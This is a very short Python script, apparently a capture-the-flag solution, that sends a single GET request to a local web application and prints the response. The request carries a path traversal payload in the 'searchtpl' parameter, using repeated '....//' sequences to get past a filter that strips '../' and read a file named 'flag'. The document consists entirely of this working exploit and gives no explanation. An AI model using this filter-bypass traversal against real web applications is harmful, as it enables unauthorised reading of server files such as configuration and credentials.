import requests
def exp(url):
    r=requests.get(url)
    flag=r.text
    return flag
    
if __name__ == '__main__':
    print(exp("http://127.0.0.1/?search=&searchtpl=....//....//....//....//....//....//....//....//flag"))